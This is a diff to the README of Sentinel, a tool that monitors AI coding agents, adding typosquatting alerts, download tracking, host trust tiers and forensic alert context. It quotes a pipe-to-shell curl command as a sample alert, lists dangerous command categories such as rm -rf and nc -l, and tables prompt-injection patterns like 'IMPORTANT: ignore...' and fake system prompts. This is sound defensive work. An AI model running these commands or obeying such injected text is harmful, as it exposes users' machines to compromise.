@@ -216,15 +216,17 @@ Sentinel checks every `pip install` and `npm install` command against a curated 
 
 ```
 Agent runs: pip install requets
-Sentinel:   🚨 Typosquatting Suspect — 'requets' looks like 'requests' (edit distance 1)
+Sentinel:   🚨 Typosquatting Suspect Package
+            'requets' looks like 'requests' (edit distance 1)
 
-Agent runs: npm install lodashs
-Sentinel:   🚨 Typosquatting Suspect — 'lodashs' looks like 'lodash' (edit distance 1)
-
-Agent runs: pip install numpyy pandas
-Sentinel:   🚨 Typosquatting Suspect — 'numpyy' looks like 'numpy' (edit distance 1)
-            ✅ 'pandas' — clean
+               Project: my-app (main @ abc123de)
+               Session: claude-opus-4-7 #36490f77 (CC 2.1.123)
+               Where:   ~/work/my-app
+               What:    pip install requets
 ```
+
+Every alert carries the same `[ctx]` block — see [Forensic Context in
+Every Alert](#forensic-context-in-every-alert) below.
 
 | Edit distance | Confidence | Alert level |
 | :-----------: | ---------- | ----------- |
@@ -247,6 +249,90 @@ Scans MCP server responses for prompt injection attempts in real time.
 | Urgency manipulation  | "IMPORTANT: ignore..."           | Social engineering via urgency         |
 | Token boundary        | `<&#124;im_start&#124;>` markers | Exploiting model token boundaries      |
 | Fake system prompt    | "system prompt: ..."             | Impersonating system messages          |
+
+#### Download Tracking
+
+AI agents that run `curl -o`, `wget`, or `git clone` create a file on
+your machine without an obvious "pipe to shell" signal — making it
+easy to lose track of where a payload in `/tmp` actually came from.
+Sentinel emits a dedicated `agent_download` event that pairs the
+**source URL with the resulting output path** so the audit log makes
+the link explicit.
+
+A 5-minute FSWatcher join window matches the `file_create` event for
+the output path back to the originating download command. Sensitive
+output paths (e.g., `~/.ssh/authorized_keys`) escalate to **critical**;
+downloads from BLOCKED or UNKNOWN hosts (per the [Context-Aware
+Trust](#context-aware-trust) section) escalate to **warning**.
+KNOWN/LEARNED hosts stay at info — they are surfaced in the audit
+log but do not push a desktop notification.
+
+Off by default — opt in via `security.download_tracking.enabled: true`.
+
+#### Context-Aware Trust
+
+Sentinel can downgrade the severity of network-connection and
+SSH/SCP alerts on hosts you have explicitly trusted or have
+historically interacted with — so the daily ssh to your team's
+bastion stops feeling like a critical alert and the things you do
+not recognize stand out.
+
+Three signals combine into a 4-tier `TrustLevel`:
+
+| Tier | Source | Effect |
+|---|---|---|
+| `KNOWN` | Entry in `~/.ssh/known_hosts` (literal, comma-joined, or wildcard) | Alert downgraded one step (warning → info) |
+| `LEARNED` | Auto-promoted after the host has been observed `auto_trust_after_seen` times within a sliding 30-day window | Alert downgraded one step |
+| `UNKNOWN` | Default for unseen hosts | No change |
+| `BLOCKED` | Listed in `security.context_aware.blocklist` (config) | **Never** downgraded — overrides KNOWN/LEARNED. Use to mark hosts you want to keep alerting on even though you ssh to them often. |
+
+Dangerous Bash categories — `pipe to shell`, `rm -rf`, `eval(`,
+`base64 -d`, `nc -l`, inline code execution, package installs — are
+**never** downgraded by host trust, regardless of the host's tier.
+This closes the obvious "auto-trust attack vector" where an attacker
+inflates frequency on their own host.
+
+**Off by default.** Opt in via `security.context_aware.enabled:
+true`. Frequency-based auto-trust is meaningful only if you actually
+want it; the daemon never learns hosts unless you explicitly enable
+this. See `sentinel context status` to inspect the current state and
+`sentinel context block` / `unblock` to manage the override list.
+
+The frequency cache lives at
+`~/.local/share/sentinel/host_context.jsonl` (mode 0o600, never
+auto-deleted, atomically rewritten with corruption quarantine).
+
+#### Forensic Context in Every Alert
+
+When something fires, the alert message tells you **who, where, what,
+how** in four lines — no grepping the audit log:
+
+```
+🚨 High-Risk AI Command Detected
+claude_code executed: curl https://x.com/install.sh | sh
+Risk: pipe to shell
+
+   Project: sentinel-mac (feat/v0.9-track-1 @ a1b2c3d4)
+   Session: claude-opus-4-7 #36490f77 (CC 2.1.123)
+   Where:   ~/Desktop/dir_UK/sentinel
+   What:    curl https://x.com/install.sh | sh
+```
+
+The `[ctx]` block is built from two sources:
+- **Session metadata** is parsed from the Claude Code JSONL session
+  file (sessionId, model, CC version, cwd at the time of the
+  command). Cursor / VS Code Continue support is on the roadmap.
+- **Project metadata** is derived from the cwd by walking up to the
+  first `.git/` / `pyproject.toml` / `package.json` (first match wins
+  — Node sub-projects nested in a Git monorepo find their own
+  `package.json` first). The git remote URL is recorded in the JSONL
+  audit log but **deliberately omitted from the alert message** so
+  opt-in notification channels (ntfy / Slack / Telegram) never leak
+  private repo identity.
+
+The same enrichment lands on the JSONL audit row, so
+`sentinel --report --json` consumers can group / filter events by
+project, session, or model trivially.
 
 #### Custom Rules (Advanced)
 
@@ -355,6 +441,11 @@ sentinel context forget evil.com       # drop from frequency counter
 sentinel context block   evil.com      # add to config blocklist (PyYAML fallback if [app] missing)
 sentinel context unblock evil.com      # remove from blocklist
 sentinel context status --json         # ADR 0004 versioned envelope
+
+# Mutating commands (forget / block / unblock) are picked up by the
+# running daemon **immediately** via SIGHUP — no `sentinel restart`
+# needed. The CLI prints "Applied to running daemon (PID NNN)." or
+# "Daemon not reachable; restart manually" on stderr.
 
 # Health check (v0.8 Track 1b, ADR 0006)
 sentinel doctor             # one-shot health check (daemon, config, perms, hooks, cache, backups)
